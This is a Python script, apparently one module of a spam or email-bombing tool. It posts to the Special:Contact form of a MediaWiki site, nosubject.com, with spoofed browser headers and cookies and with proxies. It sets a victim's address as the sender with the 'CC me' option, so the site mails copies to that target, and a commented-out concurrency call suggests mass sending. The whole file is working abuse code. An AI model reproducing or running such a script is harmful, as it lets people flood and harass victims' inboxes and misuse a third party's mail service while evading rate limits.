import requests

cookies = {
    'stopMobileRedirect': 'true',
    '_ga': 'GA1.2.1684896285.1677755201',
    '_gid': 'GA1.2.1855532551.1677755201',
    '__gads': 'ID=13e2ec6fa33f5758-2219b8583ddd0036:T=1677755202:RT=1677755202:S=ALNI_MZJvh1bKjD-8H7vb3KyHb90DIQQCQ',
    '__gpi': 'UID=000009c624fd1519:T=1677755202:RT=1677755202:S=ALNI_MZIYZ0JFFuU0SnQJgyXubu0e5aRoA',
    '_gat': '1',
}

headers = {
    'authority': 'nosubject.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': 'stopMobileRedirect=true; _ga=GA1.2.1684896285.1677755201; _gid=GA1.2.1855532551.1677755201; __gads=ID=13e2ec6fa33f5758-2219b8583ddd0036:T=1677755202:RT=1677755202:S=ALNI_MZJvh1bKjD-8H7vb3KyHb90DIQQCQ; __gpi=UID=000009c624fd1519:T=1677755202:RT=1677755202:S=ALNI_MZIYZ0JFFuU0SnQJgyXubu0e5aRoA; _gat=1',
    'origin': 'https://nosubject.com',
    'pragma': 'no-cache',
    'referer': 'https://nosubject.com/index.php?title=Special:Contact&mobileaction=toggle_view_desktop',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'Email sent'
from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        text = 'test req'
        data = {
            'wpFromName': 'name',
            'wpFromAddress': target,
            'wpSubject': text,
            'wpText': text,
            'wpCCme': '1',
            'wpEditToken': '+\\',
            'title': 'Special:Contact',
            'wpFormType': '',
        }

        response = requests.post('https://nosubject.com/Special:Contact', cookies=cookies, headers=headers, data=data, proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    # if res:
    #     spam.run_concurrently()


if __name__ == '__main__':
    main()
